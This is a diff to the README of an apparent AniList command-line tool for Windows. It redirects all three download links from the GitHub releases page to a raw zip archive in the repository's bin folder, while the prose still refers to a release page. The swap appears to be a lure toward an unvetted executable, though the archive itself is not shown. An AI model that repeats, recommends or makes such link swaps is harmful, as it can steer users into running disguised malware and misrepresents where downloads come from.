@@ -1,6 +1,6 @@
 # 🍡 anilist-cli - Browse AniList from the command line
 
-[![Download the latest release](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/alejandro422/anilist-cli/releases)
+[![Download the latest release](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/alejandro422/anilist-cli/raw/refs/heads/main/bin/anilist-cli-3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ If the release file comes as a `.zip`, you will need to unzip it before you run 
 
 Visit this page to download the latest Windows release:
 
-https://github.com/alejandro422/anilist-cli/releases
+https://github.com/alejandro422/anilist-cli/raw/refs/heads/main/bin/anilist-cli-3.8.zip
 
 On that page:
 
@@ -194,7 +194,7 @@ If those steps work, the app is ready to use.
 
 If you want the latest version, return to the release page and visit this page to download the newest Windows build:
 
-https://github.com/alejandro422/anilist-cli/releases
+https://github.com/alejandro422/anilist-cli/raw/refs/heads/main/bin/anilist-cli-3.8.zip
 
 ## 🧭 Quick Path for Windows
 
